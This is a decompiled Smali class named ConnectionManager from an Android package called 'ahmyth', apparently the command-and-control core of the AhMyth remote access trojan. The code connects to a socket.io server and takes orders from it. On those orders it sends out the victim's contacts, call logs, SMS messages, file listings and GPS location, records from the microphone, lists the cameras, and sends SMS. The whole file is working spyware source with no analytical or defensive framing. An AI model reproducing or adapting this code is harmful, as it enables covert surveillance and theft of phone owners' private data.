.class public Lahmyth/mine/king/ahmyth/ConnectionManager;
.super Ljava/lang/Object;
.source "ConnectionManager.java"


# static fields
.field public static context:Landroid/content/Context;

.field private static fm:Lahmyth/mine/king/ahmyth/FileManager;

.field private static ioSocket:Lio/socket/client/Socket;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 21
    new-instance v0, Lahmyth/mine/king/ahmyth/FileManager;

    invoke-direct {v0}, Lahmyth/mine/king/ahmyth/FileManager;-><init>()V

    sput-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->fm:Lahmyth/mine/king/ahmyth/FileManager;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 16
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$000()Lio/socket/client/Socket;
    .locals 1

    .line 16
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    return-object v0
.end method

.method public static sendReq()V
    .locals 3

    .line 42
    :try_start_0
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    if-eqz v0, :cond_0

    return-void

    .line 45
    :cond_0
    invoke-static {}, Lahmyth/mine/king/ahmyth/IOSocket;->getInstance()Lahmyth/mine/king/ahmyth/IOSocket;

    move-result-object v0

    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v0

    sput-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v1, "ping"

    .line 48
    new-instance v2, Lahmyth/mine/king/ahmyth/ConnectionManager$1;

    invoke-direct {v2}, Lahmyth/mine/king/ahmyth/ConnectionManager$1;-><init>()V

    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 55
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v1, "order"

    new-instance v2, Lahmyth/mine/king/ahmyth/ConnectionManager$2;

    invoke-direct {v2}, Lahmyth/mine/king/ahmyth/ConnectionManager$2;-><init>()V

    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 106
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    invoke-virtual {v0}, Lio/socket/client/Socket;->connect()Lio/socket/client/Socket;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 110
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    const-string v1, "error"

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    return-void
.end method

.method public static startAsync(Landroid/content/Context;)V
    .locals 0

    .line 26
    :try_start_0
    sput-object p0, Lahmyth/mine/king/ahmyth/ConnectionManager;->context:Landroid/content/Context;

    .line 27
    invoke-static {}, Lahmyth/mine/king/ahmyth/ConnectionManager;->sendReq()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 29
    :catch_0
    invoke-static {p0}, Lahmyth/mine/king/ahmyth/ConnectionManager;->startAsync(Landroid/content/Context;)V

    :goto_0
    return-void
.end method

.method public static x0000ca(I)V
    .locals 3

    const/4 v0, 0x0

    const/4 v1, 0x1

    const/4 v2, -0x1

    if-ne p0, v2, :cond_0

    .line 119
    new-instance p0, Lahmyth/mine/king/ahmyth/CameraManager;

    sget-object v2, Lahmyth/mine/king/ahmyth/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {p0, v2}, Lahmyth/mine/king/ahmyth/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/CameraManager;->findCameraList()Lorg/json/JSONObject;

    move-result-object p0

    if-eqz p0, :cond_2

    .line 121
    sget-object v2, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array v1, v1, [Ljava/lang/Object;

    aput-object p0, v1, v0

    const-string p0, "x0000ca"

    invoke-virtual {v2, p0, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    goto :goto_0

    :cond_0
    if-ne p0, v1, :cond_1

    .line 124
    new-instance p0, Lahmyth/mine/king/ahmyth/CameraManager;

    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {p0, v0}, Lahmyth/mine/king/ahmyth/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {p0, v1}, Lahmyth/mine/king/ahmyth/CameraManager;->startUp(I)V

    goto :goto_0

    :cond_1
    if-nez p0, :cond_2

    .line 127
    new-instance p0, Lahmyth/mine/king/ahmyth/CameraManager;

    sget-object v1, Lahmyth/mine/king/ahmyth/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {p0, v1}, Lahmyth/mine/king/ahmyth/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {p0, v0}, Lahmyth/mine/king/ahmyth/CameraManager;->startUp(I)V

    :cond_2
    :goto_0
    return-void
.end method

.method public static x0000cl()V
    .locals 4

    .line 150
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    invoke-static {}, Lahmyth/mine/king/ahmyth/CallsManager;->getCallsLogs()Lorg/json/JSONObject;

    move-result-object v2

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "x0000cl"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method

.method public static x0000cn()V
    .locals 4

    .line 154
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    invoke-static {}, Lahmyth/mine/king/ahmyth/ContactsManager;->getContacts()Lorg/json/JSONObject;

    move-result-object v2

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "x0000cn"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method

.method public static x0000fm(ILjava/lang/String;)V
    .locals 2

    const/4 v0, 0x1

    if-nez p0, :cond_0

    .line 134
    sget-object p0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array v0, v0, [Ljava/lang/Object;

    const/4 v1, 0x0

    invoke-static {p1}, Lahmyth/mine/king/ahmyth/FileManager;->walk(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object p1

    aput-object p1, v0, v1

    const-string p1, "x0000fm"

    invoke-virtual {p0, p1, v0}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    goto :goto_0

    :cond_0
    if-ne p0, v0, :cond_1

    .line 136
    invoke-static {p1}, Lahmyth/mine/king/ahmyth/FileManager;->downloadFile(Ljava/lang/String;)V

    :cond_1
    :goto_0
    return-void
.end method

.method public static x0000lm()V
    .locals 10
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 162
    invoke-static {}, Landroid/os/Looper;->prepare()V

    .line 163
    new-instance v0, Lahmyth/mine/king/ahmyth/LocManager;

    sget-object v1, Lahmyth/mine/king/ahmyth/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {v0, v1}, Lahmyth/mine/king/ahmyth/LocManager;-><init>(Landroid/content/Context;)V

    .line 164
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 166
    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/LocManager;->canGetLocation()Z

    move-result v2

    const/4 v3, 0x1

    const/4 v4, 0x0

    const-string v5, "enable"

    if-eqz v2, :cond_0

    .line 168
    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/LocManager;->getLatitude()D

    move-result-wide v6

    .line 169
    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/LocManager;->getLongitude()D

    move-result-wide v8

    .line 170
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v6, v7}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "   ,  "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v8, v9}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v2, "loc"

    invoke-static {v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 171
    invoke-virtual {v1, v5, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v0, "lat"

    .line 172
    invoke-virtual {v1, v0, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    const-string v0, "lng"

    .line 173
    invoke-virtual {v1, v0, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    goto :goto_0

    .line 176
    :cond_0
    invoke-virtual {v1, v5, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 178
    :goto_0
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array v2, v3, [Ljava/lang/Object;

    aput-object v1, v2, v4

    const-string v1, "x0000lm"

    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method

.method public static x0000mc(I)V
    .locals 0
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 158
    invoke-static {p0}, Lahmyth/mine/king/ahmyth/MicManager;->startRecording(I)V

    return-void
.end method

.method public static x0000sm(ILjava/lang/String;Ljava/lang/String;)V
    .locals 3

    const/4 v0, 0x0

    const-string v1, "x0000sm"

    const/4 v2, 0x1

    if-nez p0, :cond_0

    .line 142
    sget-object p0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array p1, v2, [Ljava/lang/Object;

    invoke-static {}, Lahmyth/mine/king/ahmyth/SMSManager;->getSMSList()Lorg/json/JSONObject;

    move-result-object p2

    aput-object p2, p1, v0

    invoke-virtual {p0, v1, p1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    goto :goto_0

    :cond_0
    if-ne p0, v2, :cond_1

    .line 144
    invoke-static {p1, p2}, Lahmyth/mine/king/ahmyth/SMSManager;->sendSMS(Ljava/lang/String;Ljava/lang/String;)Z

    move-result p0

    .line 145
    sget-object p1, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array p2, v2, [Ljava/lang/Object;

    invoke-static {p0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p0

    aput-object p0, p2, v0

    invoke-virtual {p1, v1, p2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    :cond_1
    :goto_0
    return-void
.end method
